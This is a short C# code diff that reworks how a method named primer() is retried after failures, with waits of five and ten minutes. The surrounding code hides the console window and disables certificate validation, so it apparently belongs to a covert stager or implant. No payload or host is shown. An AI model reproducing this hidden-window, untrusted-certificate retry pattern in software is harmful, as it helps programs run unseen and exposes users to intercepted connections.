@@ -28,12 +28,14 @@ public class Program
 		var handle = GetConsoleWindow();
 		ShowWindow(handle, SW_HIDE);
 		AllowUntrustedCertificates();
-		try { primer(); } catch { }
-		var mre = new System.Threading.ManualResetEvent(false);
-		mre.WaitOne(300000);
-		try { primer(); } catch { }
-		mre.WaitOne(600000);
-		try { primer(); } catch { }
+		try { primer(); } catch {
+			var mre = new System.Threading.ManualResetEvent(false);
+			mre.WaitOne(300000);
+			try { primer(); } catch {
+				mre.WaitOne(600000);
+				try { primer(); } catch { }
+			}
+		}
 	}
 
 	public static void Main()
